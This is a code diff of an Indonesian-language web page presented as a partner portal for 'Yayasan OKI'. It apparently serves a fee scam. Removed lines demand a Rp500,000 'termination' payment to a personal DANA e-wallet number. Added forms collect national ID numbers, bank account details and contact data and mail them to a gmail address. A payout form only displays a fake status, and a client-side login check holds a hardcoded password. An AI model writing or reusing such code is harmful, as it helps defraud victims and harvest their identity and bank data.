-  if(!proof.files.length){proof.reportValidity();return}
-  const subject="Konfirmasi Pembayaran Rp500.000 - Yayasan OKI";
-  const body=`Halo Admin Nisa,
+let mode = "daftar";
 
-Saya ingin melakukan konfirmasi pembayaran untuk status mitra Yayasan OKI.
+function pilihForm(jenis){
+ mode = jenis;
 
-Status: PEMUTUSAN MITRA - PENDING
-Nominal pembayaran: Rp500.000
-DANA: 089520623922
-Bukti transfer: ${proof.files[0].name}
+ const tabDaftar = document.getElementById("tabDaftar");
+ const tabPutus = document.getElementById("tabPutus");
+ const heading = document.getElementById("formHeading");
+ const description = document.getElementById("formDescription");
+ const alasanGroup = document.getElementById("alasanGroup");
+ const alasan = document.getElementById("alasan");
+ const jaminanBox = document.getElementById("jaminanBox");
+ const sudahBayar = document.getElementById("sudahBayar");
+ const submitButton = document.getElementById("submitButton");
 
-Mohon konfirmasi setelah pembayaran dan bukti transfer diterima.`;
-  window.location.href="mailto:okiyayasan@gmail.com?subject="+encodeURIComponent(subject)+"&body="+encodeURIComponent(body);
-};
-document.getElementById("out").onclick=()=>{portal.classList.add("hidden");login.classList.remove("hidden");p.value=""};
-document.getElementById("send").onclick=()=>{if(!proof.files.length){proof.reportValidity();return}let m=`Halo Admin Nisa, saya ingin konfirmasi status mitra Yayasan OKI.\n\nStatus: PEMUTUSAN MITRA - PENDING\nNominal: Rp500.000\nNomor DANA: 089520623922\nBukti transfer: ${proof.files[0].name}`;open("https://wa.me/"+WA+"?text="+encodeURIComponent(m),"_blank")};
-</script></body></html>
+ if(jenis === "daftar"){
+  tabDaftar.classList.add("active");
+  tabPutus.classList.remove("active");
+  heading.textContent = "Form Pendaftaran Mitra Kerja";
+  description.textContent = "Silakan lengkapi seluruh data yang diperlukan.";
+  alasanGroup.style.display = "none";
+  alasan.required = false;
+  jaminanBox.style.display = "none";
+  sudahBayar.required = false;
+  submitButton.textContent = "KIRIM PENDAFTARAN";
+ }else{
+  tabPutus.classList.add("active");
+  tabDaftar.classList.remove("active");
+  heading.textContent = "Form Pemutusan Hubungan Mitra";
+  description.textContent = "Lengkapi data, alasan pemutusan, dan ikuti ketentuan pembayaran.";
+  alasanGroup.style.display = "block";
+  alasan.required = true;
+  jaminanBox.style.display = "block";
+  sudahBayar.required = true;
+  submitButton.textContent = "KIRIM PENGAJUAN PEMUTUSAN";
+ }
+}
+
+document.getElementById("mainForm").addEventListener("submit", function(e){
+ e.preventDefault();
+
+ const nik = document.getElementById("nik").value.trim();
+ const file = document.getElementById("dokumen").files[0];
+ const nama = document.getElementById("nama").value.trim();
+ const hp = document.getElementById("hp").value.trim();
+ const email = document.getElementById("email").value.trim();
+ const pendidikan = document.getElementById("pendidikan").value;
+ const bank = document.getElementById("bank").value;
+ const rekening = document.getElementById("rekening").value.trim();
+ const pemilik = document.getElementById("pemilikRekening").value.trim();
+ const alasan = document.getElementById("alasan").value.trim();
+
+ if(!/^\d{16}$/.test(nik)){ alert("NIK harus terdiri dari 16 digit angka."); return; }
+ if(file){
+  if(file.type !== "application/pdf"){ alert("Dokumen harus dalam format PDF."); return; }
+  if(file.size > 5 * 1024 * 1024){ alert("Ukuran file PDF maksimal 5 MB."); return; }
+ }
+ if(mode === "putus" && !document.getElementById("sudahBayar").checked){
+  alert("Silakan baca ketentuan dan centang konfirmasi pembayaran terlebih dahulu.");
+  return;
+ }
+
+ const jenis = mode === "putus" ? "PEMUTUSAN HUBUNGAN MITRA" : "PENDAFTARAN MITRA KERJA";
+ const subject = encodeURIComponent("YAYASAN OKI - " + jenis + " - " + nama);
+ const body = encodeURIComponent(
+  "DATA PENGAJUAN YAYASAN OKI\n\n" +
+  "Jenis Pengajuan: " + jenis + "\n" +
+  "Nama: " + nama + "\n" +
+  "NIK: " + nik + "\n" +
+  "Nomor HP: " + hp + "\n" +
+  "Email: " + email + "\n" +
+  "Pendidikan: " + pendidikan + "\n" +
+  "Bank: " + bank + "\n" +
+  "Nomor Rekening: " + rekening + "\n" +
+  "Nama Pemilik Rekening: " + pemilik + "\n" +
+  (mode === "putus" ? "Alasan Pemutusan: " + alasan + "\n" : "") +
+  "\nDokumen PDF: " + (file ? file.name : "Tidak ada") +
+  "\n\nEmail dibuat dari Portal Yayasan OKI."
+ );
+
+ document.getElementById("successMessage").style.display = "block";
+ window.location.href = "mailto:okiyayasan@gmail.com?subject=" + subject + "&body=" + body;
+});
+
+document.getElementById("payoutForm").addEventListener("submit", function(e){
+  e.preventDefault();
+  const name = document.getElementById("payoutName").value.trim();
+  const account = document.getElementById("payoutAccount").value.trim();
+  if(!name || !/^\d{5,30}$/.test(account)){
+    alert("Masukkan nama pemilik rekening dan nomor rekening yang valid.");
+    return;
+  }
+  document.getElementById("payoutFormWrap").style.display = "none";
+  document.getElementById("payoutStatus").style.display = "block";
+});
+
+document.getElementById("payoutAccount").addEventListener("input", function(){
+  this.value = this.value.replace(/\D/g, "").slice(0, 30);
+});
+
+document.getElementById("nik").addEventListener("input",function(){
+ this.value = this.value.replace(/\D/g,"").slice(0,16);
+});
+
+document.getElementById("rekening").addEventListener("input",function(){
+ this.value = this.value.replace(/\D/g,"");
+});
+
+document.querySelectorAll(".faq-question").forEach(function(button){
+ button.addEventListener("click",function(){
+  this.parentElement.classList.toggle("open");
+ });
+});
+
+document.getElementById("loginForm").addEventListener("submit", function(e){
+ e.preventDefault();
+ const username = document.getElementById("loginUser").value.trim();
+ const password = document.getElementById("loginPass").value;
+
+ if(username === "member958" && password === "nia231100"){
+  document.getElementById("loginScreen").style.display = "none";
+  sessionStorage.setItem("okiLogin","1");
+ }else{
+  document.getElementById("loginError").style.display = "block";
+ }
+});
+
+if(sessionStorage.getItem("okiLogin") === "1"){
+ document.getElementById("loginScreen").style.display = "none";
+}
+
+</script>
+</body>
+</html>
